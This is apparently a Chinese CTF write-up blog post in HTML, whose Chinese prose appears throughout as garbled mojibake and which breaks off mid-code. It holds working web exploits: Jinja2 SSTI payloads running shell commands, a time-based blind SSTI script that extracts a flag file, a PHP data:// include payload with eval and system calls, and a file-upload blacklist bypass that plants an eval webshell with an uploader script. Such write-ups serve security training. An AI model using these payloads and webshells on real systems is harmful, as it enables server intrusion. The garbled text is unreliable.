<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    user_input = request.args.get(<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(user_input)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>user_input</code> ç›´æ¥æ¥è‡ªç”¨æˆ·è¯·æ±‚å‚æ•°ï¼Œå¹¶è¢«ä¼ é€’ç»™ <code>render_template_string</code>ã€‚å¦‚æœç”¨æˆ·ä¼ é€’ä¸€ä¸ªæ¶æ„çš„æ¨¡æ¿è¡¨è¾¾å¼ä½œä¸ºè¾“å…¥ï¼Œå°±å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssti?input=&#123;&#123; 7*7 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ç§è¯·æ±‚ä¼šå¯¼è‡´ Flask æ¸²æŸ“æ¨¡æ¿å­—ç¬¦ä¸² <code>&#123;&#123; 7*7 &#125;&#125;</code>ï¼Œå¹¶è¿”å›ç»“æœ <code>49</code>ã€‚</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807225109328.png" alt="image-20240807225109328"></p>
<p>æ›´ä¸¥é‡çš„ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssti?input=&#123;&#123; &quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè¯·æ±‚åˆ©ç”¨äº† Jinja2 æ¨¡æ¿çš„å¼ºå¤§åŠŸèƒ½ï¼Œè°ƒç”¨ Python çš„å†…ç½®å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¯èƒ½ä¼šæš´éœ²æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<h3 id="é˜²å¾¡æªæ–½-1"><a href="#é˜²å¾¡æªæ–½-1" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h3><p>ä¸ºäº†é˜²æ­¢ SSTI æ¼æ´ï¼Œåº”é¿å…ç›´æ¥æ¸²æŸ“ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p>
<ol>
<li><strong>è¾“å…¥éªŒè¯å’Œæ¸…ç†</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ã€‚</li>
<li><strong>é¿å…ç›´æ¥æ¸²æŸ“ç”¨æˆ·è¾“å…¥</strong>ï¼šå°½é‡ä¸è¦å°†ç”¨æˆ·è¾“å…¥ç›´æ¥ä¼ é€’ç»™ <code>render_template_string</code>ã€‚</li>
<li><strong>ä½¿ç”¨æ²™ç®±ç¯å¢ƒ</strong>ï¼šå¦‚æœå¿…é¡»æ¸²æŸ“ç”¨æˆ·æä¾›çš„æ¨¡æ¿ï¼Œè€ƒè™‘ä½¿ç”¨æ²™ç®±ç¯å¢ƒæ¥é™åˆ¶æ¨¡æ¿çš„åŠŸèƒ½ã€‚</li>
</ol>
<h3 id="ä¾‹å­ï¼š-1"><a href="#ä¾‹å­ï¼š-1" class="headerlink" title="ä¾‹å­ï¼š"></a>ä¾‹å­ï¼š</h3><p>é˜²æ­¢ SSTI çš„ä¸€ç§æ–¹æ³•æ˜¯å°†ç”¨æˆ·è¾“å…¥è¿›è¡Œè½¬ä¹‰ï¼Œç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸ä¼šè¢«è§£æä¸ºæ¨¡æ¿è¡¨è¾¾å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, escape</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/safe_ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_ssti</span>():</span><br><span class="line">    user_input = request.args.get(<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    safe_input = escape(user_input)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;User input: &#123;&#123; input &#125;&#125;&quot;</span>, <span class="built_in">input</span>=safe_input)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>escape</code> å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰ï¼Œç¡®ä¿å®ƒä½œä¸ºæ™®é€šå­—ç¬¦ä¸²è€Œä¸æ˜¯æ¨¡æ¿è¡¨è¾¾å¼è¿›è¡Œæ¸²æŸ“ã€‚</p>
<p>poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">char_set = <span class="string">&quot;1234567890abcdef-&quot;</span></span><br><span class="line">sess = req.session()</span><br><span class="line">flag = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char_set:</span><br><span class="line">        url = <span class="string">r&quot;&quot;&quot;http://045c5218-6cbf-40a3-a131-718130bef6d9.challenge.ctf.show/ssti?input=&#123;&#123;lipsum.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;if [ `cut -c %d /app/flag.txt` = \&quot;%s\&quot; ];then sleep 2;fi&#x27;).read()&quot;)&#125;&#125;&quot;&quot;&quot;</span> % (i, c)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        resp = sess.get(url)</span><br><span class="line">        <span class="keyword">if</span> resp.elapsed.seconds &gt;= <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(c, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            flag[i] = c</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="å•èº«æ¯webç­¾åˆ°-1"><a href="#å•èº«æ¯webç­¾åˆ°-1" class="headerlink" title="å•èº«æ¯webç­¾åˆ°"></a>å•èº«æ¯webç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dataåè®®åï¼Œphpæ ‡è®°?&gt;é—­åˆåå¯ä»¥åŠ ä»»æ„å­—ç¬¦ã€‚</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807231322397.png" alt="image-20240807231322397"></p>
<p>åˆ°è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°phpä»£ç å·²ç»æ‰§è¡Œï¼Œåé¢çš„å·²ç»è¢«?&gt;æ‰€æˆªæ–­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807231420222.png" alt="image-20240807231420222"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&#x27;nl /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807231459137.png" alt="image-20240807231459137"></p>
<h2 id="GHCTF-2024-PermissionDenied-1"><a href="#GHCTF-2024-PermissionDenied-1" class="headerlink" title="[GHCTF 2024]PermissionDenied"></a>[GHCTF 2024]PermissionDenied</h2><p>é¢˜ç›®æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;pHp&quot;</span>,<span class="string">&quot;pHp5&quot;</span>,<span class="string">&quot;pHp4&quot;</span>,<span class="string">&quot;pHp3&quot;</span>,<span class="string">&quot;pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;Html&quot;</span>,<span class="string">&quot;Htm&quot;</span>,<span class="string">&quot;pHtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;jSp&quot;</span>,<span class="string">&quot;jSpx&quot;</span>,<span class="string">&quot;jSpa&quot;</span>,<span class="string">&quot;jSw&quot;</span>,<span class="string">&quot;jSv&quot;</span>,<span class="string">&quot;jSpf&quot;</span>,<span class="string">&quot;jHtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;aSp&quot;</span>,<span class="string">&quot;aSpx&quot;</span>,<span class="string">&quot;aSa&quot;</span>,<span class="string">&quot;aSax&quot;</span>,<span class="string">&quot;aScx&quot;</span>,<span class="string">&quot;aShx&quot;</span>,<span class="string">&quot;aSmx&quot;</span>,<span class="string">&quot;cEr&quot;</span>,<span class="string">&quot;sWf&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$deny_ext</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filecontent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">blacklist</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$filecontent</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!!!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">12345678910111213141516171819202122232425</span></span><br></pre></td></tr></table></figure>

<p>file_put_contentå‡½æ•°æœ‰ä¸€ä¸ªæ–‡ä»¶è§£æçš„æ¼æ´</p>
<blockquote>
<p>å½“ä¸Šä¼ <code>123.php/.</code>çš„æ—¶å€™ï¼Œfile_put_contentså‡½æ•°ä¼šè®¤ä¸ºæ˜¯è¦åœ¨123.phpæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º<code>.</code>çš„æ–‡ä»¶ï¼Œæœ€ç»ˆä¸Šä¼ åˆ›å»ºçš„æ˜¯123.php</p>
</blockquote>
<p>123.phpå†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:25045/&quot;</span></span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:(<span class="string">&quot;123.php%2f.&quot;</span>,<span class="built_in">open</span>(<span class="string">&#x27;123.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,files=file).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240817140038899.png" alt="image-20240817140038899"></p>
<h2 id="ç»™ä½ shell-1"><a href="#ç»™ä½ shell-1" class="headerlink" title="ç»™ä½ shell"></a>ç»™ä½ shell</h2><p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240817214950410.png" alt="image-20240817214950410"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240817215000531.png" alt="image-20240817215000531"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ea50473b-4923-4d2b-b3a8-7a54a9a40e5f.challenge.ctf.show/?view_source</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="number">0</span>] === <span class="string">&#x27;&#123;&quot;secret&quot;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;</span>, <span class="variable">$arr</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">theFirstTimeSetCookie</span>() ) <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span>(<span class="params"><span class="variable">$_f_g</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$_g_r</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$_m_u</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_f_g</span>);</span><br><span class="line">    <span class="variable">$_h_p</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_m_u</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$_g_r</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_h_p</span>, <span class="variable">$i</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$_i</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$_i</span> &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>]) ? <span class="variable">$json</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>] : <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#123;&quot;secret&quot;:&quot;&#x27;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;y1ng&#x27;</span>)) . <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">7200</span> );</span><br><span class="line"><span class="title function_ invoke__">checkCookie</span>(<span class="variable">$json</span>) ? <span class="variable">$obj</span> = @<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>) : <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;give_me_shell&#x27;</span>])) &#123;</span><br><span class="line">    (<span class="variable">$obj</span>[<span class="string">&#x27;secret&#x27;</span>] != <span class="variable">$flag_md5</span> ) ? <span class="title function_ invoke__">haveFun</span>(<span class="variable">$flag</span>) : <span class="keyword">echo</span> <span class="string">&quot;here is your webshell: <span class="subst">$shell_path</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<p>è§£é‡Šä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$s</span>); <span class="comment">// æŠŠsä»¥:åˆ†å‰²æˆæ•°ç»„</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="number">0</span>] === <span class="string">&#x27;&#123;&quot;secret&quot;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;</span>, <span class="variable">$arr</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">// æ£€æŸ¥$arr[1]æ˜¯å¦ç”±æ•°å­—å’Œè‹±æ–‡å­—æ¯A-Zè¿˜æœ‰&quot;ç»„æˆ</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="title function_ invoke__">theFirstTimeSetCookie</span>() ) <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span>(<span class="params"><span class="variable">$_f_g</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$_g_r</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$_m_u</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_f_g</span>); <span class="comment">// md5åŠ å¯†</span></span><br><span class="line">    <span class="variable">$_h_p</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_m_u</span>); <span class="comment">// è½¬æˆå¤§å†™</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$_g_r</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_h_p</span>, <span class="variable">$i</span>, <span class="number">1</span>);  <span class="comment">// ä»ç¬¬ä¸€ä½å¼€å§‹ï¼Œä¸€ä¸ªä¸€ä¸ªçš„å–</span></span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$_i</span>); <span 